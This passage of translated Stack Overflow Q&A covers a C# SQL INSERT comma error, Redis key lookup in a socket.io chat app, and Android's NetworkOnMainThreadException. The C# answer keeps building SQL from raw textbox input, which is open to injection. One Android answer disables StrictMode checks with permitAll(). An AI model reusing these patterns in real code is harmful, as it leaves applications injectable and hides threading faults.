com.CommandText = ("INSERT INTO Stock (Prod_ID, Prod_Name, Prod_Cat, Supplier, Cost, Price_1, Price_2, Price_3) VALUES ('"+ProdID.Text+"','"+ProdName.Text+"','"+ProdCat.Text+"','"+ProdSup.Text+"','"+ProdCost.Text+"','"+ProdPrice1.Text+"','"+ProdPrice2.Text+"','"+ProdPrice3.Text+"');"); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-25T13:28:58.013

你应该更换

```
 ('"+ProdID.Text+"''"+ProdName.Text+"'+'"+ProdCat.Text+"'+'"+ProdSup.Text+"'+'"+ProdCost.Text+"'+'"+ProdPrice1.Text+"'+'"+ProdPrice2.Text+"'+'"+ProdPrice3.Text+"');");` 
```

和

```
('"+ProdID.Text+"','"+ProdName.Text+"','"+ProdCat.Text+"','"+ProdSup.Text+"','"+ProdCost.Text+"','"+ProdPrice1.Text+"','"+ProdPrice2.Text+"','"+ProdPrice3.Text+"');");` 
```

（`VALUES`每列的部分需要逗号）

# node.js - 如何从redis存储客户端的键/值对中的值中获取键？

> ID：16215996
> 
> 赞同：2
> 
> 时间：2013-04-25T13:24:47.920
> 
> 标签：node.js, dictionary, redis, socket.io, node-redis

我将用户名/SocketID 对存储在我的 socket.io 聊天应用程序的 redis 存储中。

当用户断开连接时，我需要从 redis 存储中删除用户名/socketID 对。我已经看到了如何从键中获取值，但从来没有从值中获取键。是否可以？或者无论哪种方式，我如何才能从值中删除键/值对。这是我的代码

用于在连接时添加到存储

```
socket.on('username', function (username) {

    client.set(username, socket.id, function (err) {
        console.log(username + ":" + socket.id);
    });

}); 
```

对于断开连接，客户端不知道何时会发生断开连接，这可能是由于失去互联网连接而发生的，但是当套接字断开连接时，它总是会触发“断开连接”事件。在这种情况下，我需要删除用户名/socketID 对。

```
socket.on('disconnect', function () {

// dont know the username??

    client.del(username, socket.id, function (err) {
        if (err)
            console.log(err);
        else {
            socket.disconnect();
            console.log(socket.id + " DISCONNECTED");
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T06:30:51.467

最简单的方法是存储**两**对。一个与`username/id`一个与`id/username`。因此，无论您拥有什么信息，您都可以获得另一个信息，因此也可以获得另一个键/值对。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:27:34.730

我建议您将 socket.io Id 合并到密钥中，例如

```
id:username 
```

然后你可以做这样的事情

```
client.keys([socket.id + ':*'], function (err, result) {
    if (err){
        //handle in some way
    }

    for (var r in result) {
        var key = result[r];

        client.del(key, function(err, result){
            // handle in some way
        });
    }
}); 
```

# android - 更新主 UI 线程或 AsyncTask 永远不允许比我在哪里可以更新 UI 线程？

> ID：16215998
> 
> 赞同：-6
> 
> 时间：2013-04-25T13:24:55.533
> 
> 标签：android, android-asynctask, android-ui

```
Caused by: android.os.NetworkOnMainThreadException
04-25 13:15:52.362: E/AndroidRuntime(20900):    at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1117)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.io.BlockGuardOs.connect(BlockGuardOs.java:84)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.io.IoBridge.connectErrno(IoBridge.java:127)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.io.IoBridge.connect(IoBridge.java:112)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:192)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:459)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at java.net.Socket.connect(Socket.java:842)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpConnection.<init>(HttpConnection.java:76)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpConnection.<init>(HttpConnection.java:50)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpConnection$Address.connect(HttpConnection.java:340)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:87)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpConnection.connect(HttpConnection.java:128)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:316)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpEngine.connect(HttpEngine.java:311)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:290)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:240)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at libcore.net.http.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:81)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at java.net.URLConnection.getContent(URLConnection.java:190)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at java.net.URL.getContent(URL.java:447)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at biz.xicom.printvintage.HomeScreen$2.run(HomeScreen.java:199)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at android.app.Activity.runOnUiThread(Activity.java:4644)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at biz.xicom.printvintage.HomeScreen.setview(HomeScreen.java:193)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at biz.xicom.printvintage.HomeScreen.onCreate(HomeScreen.java:58)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at android.app.Activity.performCreate(Activity.java:5104)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1080)
    04-25 13:15:52.362: E/AndroidRuntime(20900):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2144) 
```

**代码**

```
 for (int i = 0; i < image_list.size(); i++) {
        LayoutInflater layoutInflator = HomeScreen.this.getLayoutInflater();
        LinearLayout childlayout = (LinearLayout) layoutInflator.inflate(
                R.layout.image_text_web_services_inflate, mPager, false);
        im = (ImageView) childlayout.findViewById(R.id.image_web_service);
        t = (TextView) childlayout.findViewById(R.id.text_web_service);

        t.setText(HomeScreen.detail_list.get(i));
        final int j=i;
        runOnUiThread(new Runnable() {
            public void run(){   
                try {
                    Bitmap bitmap = BitmapFactory
                            .decodeStream((InputStream) new URL(
                                    HomeScreen.image_list.get(j))
                                    .getContent());
                    im.setImageBitmap(bitmap);
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        mPager.addView(childlayout);
    } 
```

我阅读了以下链接：

[加载更多 - 只有创建视图层次结构的原始线程才能接触其视图](https://stackoverflow.com/questions/14253189/load-more-only-the-original-thread-that-created-a-view-hierarchy-can-touch-its)

[android - 引起：android.view.ViewRootImpl$CalledFromWrongThreadException](https://stackoverflow.com/questions/11204079/android-caused-by-android-view-viewrootimplcalledfromwrongthreadexception)

**每个人都说**

您正在尝试更新您的主 UI 线程或 AsyncTask 从未允许这样做。

**然后我可以在哪里更新或显示我的图像。**

也试试**AsyncTask**。 **而不是如何实现循环**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:56:04.217

使用此代码会有所帮助，

```
StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
StrictMode.setThreadPolicy(policy); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:28:32.303

当您尝试在 Loop 中加载图像时，我建议您实现**图像的延迟加载**逻辑。

以下是一些您可以尝试的库：

1.  [懒惰列表](https://github.com/thest1/LazyList)
2.  [适用于 Android 的通用图像加载器](https://github.com/nostra13/Android-Universal-Image-Loader)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T14:01:51.710

您正在 UI 线程中调用 Web 服务。Android 不允许您在 API>=3.0 的 UI 线程中执行网络操作。

解决方案：

1.  在不同的线程中加载图像。

    ```
    new Thread()
    {
         @Override
         public void run() 
         {
            // load image here
            super.run();
         }
    }.start(); 
    ```

2.  使用[LazyList](https://github.com/king-dev/LazyList)将是解决此问题的好方法。

3.  你也可以使用 AsyncTask。

    ```
    class MyAsyncTask extends AsyncTask<String, String, String> {

    @Override
    protected void onPreExecute() {
     // Runs on UI thread- Any code you wants 
     // to execute before web service call. Put it here.
     // Eg show progress dialog
    }
    @Override
    protected String doInBackground(String... params) {
      // Runs in background thread
        String result = //your web service request;         

         return result;
    }

    @Override
    protected void onProgressUpdate(String... values) {
        super.onProgressUpdate(values);
    }

    @Override
    protected void onPostExecute(String resp) {

      // runs in UI thread - You may do what you want with response 
      // Eg Cancel progress dialog - Use result         
    }
    } 
    ```